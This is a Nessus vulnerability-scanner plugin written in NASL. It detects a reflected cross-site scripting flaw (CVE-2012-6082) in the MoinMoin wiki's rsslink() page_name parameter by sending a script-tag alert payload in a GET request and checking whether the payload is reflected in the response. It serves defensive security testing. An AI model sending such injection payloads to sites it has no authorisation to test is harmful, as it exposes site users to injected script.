#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64931);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/16 14:12:49 $");

  script_cve_id("CVE-2012-6082");
  script_bugtraq_id(57089);
  script_osvdb_id(88826);

  script_name(english:"MoinMoin rsslink() Function page_name Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A wiki application on the remote web server is affected by a cross-
site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The MoinMoin install hosted on the remote web server fails to properly
sanitize user-supplied input in the 'page_name' parameter when creating
an rss link.  An attacker may be able to leverage this issue to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site. 

Note that the application is also reportedly affected by a directory
traversal vulnerability (CVE-2012-6080) as well as a remote code
execution vulnerability (CVE-2012-6081).  Nessus has not, however,
tested for these additional issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://moinmo.in/SecurityFixes");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.9.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/12/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moinmo:moinmoin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("moinmoin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/moinmoin");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname:"moinmoin",
  port:port,
  exit_on_fail:TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

xss_test = '"><script>alert("' + (SCRIPT_NAME - ".nasl") + '-' + unixtime() +
  '")</script>';

res = http_send_recv3(
  method       : "GET",
  item         : dir + "/" + xss_test,
  port         : port,
  exit_on_fail : TRUE,
  fetch404     : TRUE
);

if (
  ">MoinMoin Powered</a>" >< res[2] &&
  xss_test + '" href="' >< res[2]
)
{
  output = extract_pattern_from_resp(string:res[2], pattern:'ST:'+xss_test);
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists using the following URL :' +
      '\n' +
      '\n' + install_url + xss_test +
      '\n';
    if (report_verbosity > 1)
    {
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report +=
        '\n' + 'This produced the following response :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "MoinMoin", install_url);
